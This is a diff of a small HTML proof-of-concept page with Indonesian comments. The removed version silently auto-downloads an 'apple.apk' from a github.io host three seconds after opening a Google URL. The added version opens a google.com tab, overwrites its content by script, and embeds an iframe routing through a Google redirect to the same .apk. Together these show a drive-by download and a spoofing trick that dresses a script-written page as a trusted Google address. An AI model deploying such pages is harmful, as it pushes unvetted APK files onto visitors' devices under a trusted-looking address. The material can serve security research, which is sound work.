@@ -1,34 +1,45 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>PoC dengan Auto-Download</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download File .txt</title>
+    <script>
+        function go() {
+            // Membuka tab baru dengan URL yang ditentukan
+            var x = window.open('https://www.google.com/csi', '_blank'); 
+
+            setTimeout(function(){
+                // Menambahkan konten di tab yang baru
+                x.document.body.innerHTML = 
+                    '<h1>Welcome to the Page</h1>' +
+                    '<p>This page was opened by a script. Please review the content carefully.</p>' +
+                    '<br><br>' +
+                    // Tombol untuk mendownload file
+                    '<button onclick="downloadFile()">Download Text File</button>' +
+                    '<br><br>' +
+                    // Link untuk manual download
+                    '<a href="https://www.example.com/path/to/your/file.txt" download="file.txt">Download the File (Manual)</a>' +
+                    '<br><br>' +
+                    // Menampilkan iframe dari sumber yang terpercaya
+                    '<h2>Embedded iFrame Example</h2>' +
+                    '<iframe src="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fapple.apk&sa=D&sntz=1&usg=AOvVaw0onE08hhdtlihXeKuCFYTr" width="600" height="400"></iframe>';
+            }, 3000);
+        }
+
+        // Fungsi untuk mendownload file dari URL tertentu
+        function downloadFile() {
+            const fileUrl = 'https://www.example.com/path/to/your/file.txt'; // Ganti dengan URL file yang ingin diunduh
+
+            // Membuat link untuk mendownload file dari URL yang ditentukan
+            var link = document.createElement('a');
+            link.href = fileUrl;
+            link.download = 'file.txt'; // Nama file saat diunduh
+            link.click(); // Memulai proses download
+        }
+    </script>
 </head>
 <body>
-
-<h2>Click the button to open a link and auto-download file</h2>
-
-<!-- Tombol untuk memicu proses -->
-<button onclick="go()">Open Link & Download File</button>
-
-<script>
-function go() {
-    // Membuka jendela baru dengan URL eksternal
-    var x = window.open('https://www.google.com/csi');
-
-    // Setelah 3 detik, file akan mulai diunduh
-    setTimeout(function () {
-        try {
-            // Membuat elemen <a> untuk memulai download
-            var link = document.createElement('a');
-            link.href = 'https://ecdnts-del.github.io/test-apk/apple.apk'; // Ganti dengan URL file yang aman
-            link.download = 'apple.apk'; // Nama file yang akan diunduh
-            link.click(); // Memicu download otomatis
-        } catch (e) {
-            console.error('Error during auto-download: ', e);
-        }
-    }, 3000); // Waktu tunggu sebelum download dimulai (3 detik)
-}
-</script>
-
+    <button onclick="go()">Open Google and Download File</button> <!-- Tombol untuk membuka tab Google/CSI -->
 </body>
 </html>
